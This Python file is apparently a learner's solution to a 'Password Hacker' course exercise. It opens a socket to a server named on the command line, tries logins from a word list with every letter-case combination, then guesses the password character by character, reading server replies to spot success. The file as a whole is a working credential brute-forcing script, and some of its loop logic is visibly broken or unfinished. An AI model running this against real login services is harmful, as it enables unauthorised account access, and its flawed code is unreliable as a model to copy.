import socket
import json
from cmdline import get_cmdline_args
from login_pwd_data import (ALL_ELEMENTS_STR,
                            verify_creds_crack,
                            gen_case_combos_for_word,
                            get_user_login_data,
                            )
from socket_conn import socket_operation


def check_creds(socket_conn: socket, creds_data: list[str], creds_type: str) -> str | None:
    for val in creds_data:
        if val.isalpha():
            val_combos = gen_case_combos_for_word(val)
            for val_combo in val_combos:
                cracked_creds[creds_type] = val_combo
                response = socket_operation(socket_connection=socket_conn,
                                            msg_to_send=json.dumps(cracked_creds))
                if verify_creds_crack(msg=response):
                    return val_combo

                if pwd_chars:
                    while not verify_creds_crack(msg=response):
                        if verify_creds_crack(msg=response):
                            pwd_chars.append(val_combo)
                        return cracked_creds

        cracked_creds[creds_type] = val
        response = socket_operation(socket_connection=socket_conn,
                                    msg_to_send=json.dumps(cracked_creds))
        if verify_creds_crack(msg=response):
            if creds_type in ("password", "creds"):
                pwd_chars.append(val)
            return val


def main():
    inputs_cmdline = get_cmdline_args()
    server_data = (inputs_cmdline.ipaddress, inputs_cmdline.port)
    with socket.socket() as client_socket:
        client_socket.connect(server_data)
        cracked_creds["login"] = check_creds(socket_conn=client_socket,
                                             creds_data=logins,
                                             creds_type="login")
        cracked_creds["password"] = check_creds(socket_conn=client_socket,
                                                creds_data=ALL_ELEMENTS_STR,
                                                creds_type="password")


if __name__ == "__main__":
    # pwd_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
    #             "Python)/task/passwords.txt")
    # passwords = get_user_login_data(file_path=pwd_file)

    login_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
                  "Python)/task/logins.txt")
    logins = get_user_login_data(file_path=login_file)
    pwd_chars = []
    cracked_creds = {
        "login": "",
        "password": "".join(pwd_chars)
    }
    main()
    print(cracked_creds)
